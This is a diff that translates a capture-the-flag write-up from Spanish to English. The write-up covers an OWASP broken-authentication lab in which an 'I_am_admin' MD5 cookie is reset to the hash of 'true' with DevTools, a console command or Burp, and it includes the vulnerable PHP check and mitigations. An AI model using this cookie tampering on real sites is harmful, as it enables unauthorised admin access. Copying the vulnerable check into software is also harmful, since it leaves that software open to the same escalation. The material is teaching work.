@@ -1,52 +1,52 @@
 # A2 - Broken Authentication (Cookie Manipulation)
 
-Vulnerabilidad del OWASP Top 10 (2017). La aplicación controla los privilegios de administrador mediante una cookie `I_am_admin` cuyo valor es un hash MD5 manipulable por el cliente.
+OWASP Top 10 (2017) vulnerability. The application controls admin privileges through an `I_am_admin` cookie whose value is an MD5 hash manipulable by the client.
 
 ---
 
-## Pasos para obtener la flag
+## Steps to Obtain the Flag
 
-### 1. Identificar la cookie
+### 1. Identify the Cookie
 
-Abrir DevTools (F12) → `Application` → `Cookies`. Se encuentra:
+Open DevTools (F12) → `Application` → `Cookies`. You'll find:
 ```
 I_am_admin=68934a3e9455fa72420237eb05902327
 ```
 
-### 2. Descifrar el hash
+### 2. Decrypt the Hash
 
-El hash MD5 `68934a3e9455fa72420237eb05902327` → corresponde a `false`.
+The MD5 hash `68934a3e9455fa72420237eb05902327` → corresponds to `false`.
 
-### 3. Generar el hash de `true`
+### 3. Generate the Hash for `true`
 
 ```bash
 echo -n "true" | md5sum
 # b326b5062b2f0e69046810717534cb09
 ```
 
-### 4. Explotar
+### 4. Exploit
 
-**Método A – DevTools:**
+**Method A – DevTools:**
 1. DevTools → `Application` → `Cookies`
-2. Cambiar el valor de `I_am_admin` a `b326b5062b2f0e69046810717534cb09`
-3. Recargar la página → se muestra la **flag**
+2. Change the `I_am_admin` value to `b326b5062b2f0e69046810717534cb09`
+3. Reload the page → the **flag** is displayed
 
-**Método B – Consola del navegador:**
+**Method B – Browser Console:**
 ```js
 document.cookie = "I_am_admin=b326b5062b2f0e69046810717534cb09; path=/";
 location.reload();
 ```
 
-**Método C – Burp Suite:**
+**Method C – Burp Suite:**
 ```
 Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09
 ```
 
-### 5. Por qué funciona
+### 5. Why It Works
 
-El servidor confía ciegamente en el valor de la cookie sin validación criptográfica ni verificación del estado real del usuario:
+The server blindly trusts the cookie value without cryptographic validation or verification of the actual user state:
 ```php
-// Código vulnerable
+// Vulnerable Code
 if ($_COOKIE['I_am_admin'] === md5('true')) {
     showFlag();
 }
@@ -54,27 +54,27 @@ if ($_COOKIE['I_am_admin'] === md5('true')) {
 
 ---
 
-## Referencia de hashes MD5
+## MD5 Hash Reference
 
-| Valor   | MD5                              |
+| Value   | MD5                              |
 |---------|----------------------------------|
 | `false` | 68934a3e9455fa72420237eb05902327 |
 | `true`  | b326b5062b2f0e69046810717534cb09 |
 
 ---
 
-## Impacto
+## Impact
 
-- **Escalada de privilegios:** cualquier usuario puede convertirse en administrador.
-- **Bypass de autenticación:** sin necesidad de credenciales válidas.
-- **Compromiso total:** acceso a funcionalidades y datos restringidos.
+- **Privilege Escalation:** any user can become an admin.
+- **Authentication Bypass:** without valid credentials.
+- **Complete Compromise:** access to restricted functionality and data.
 
 ---
 
-## Mitigación
+## Mitigation
 
-1. **Control de acceso en servidor:** verificar el rol del usuario contra la base de datos, nunca desde una cookie.
-2. **Sesiones en servidor:** almacenar el estado en `$_SESSION`, no en el cliente.
-3. **Firmar cookies con HMAC** o usar **JWT** para detectar manipulaciones.
-4. **Flags de seguridad en cookies:** `HttpOnly`, `Secure`, `SameSite=Strict`.
-5. **No usar MD5 para seguridad:** está criptográficamente roto; usar SHA-256 con sal o `password_hash()`.
+1. **Server-side Access Control:** verify user role against database, never from a cookie.
+2. **Server-side Sessions:** store state in `$_SESSION`, not on the client.
+3. **Sign Cookies with HMAC** or use **JWT** to detect tampering.
+4. **Cookie Security Flags:** `HttpOnly`, `Secure`, `SameSite=Strict`.
+5. **Don't Use MD5 for Security:** it's cryptographically broken; use SHA-256 with salt or `password_hash()`.
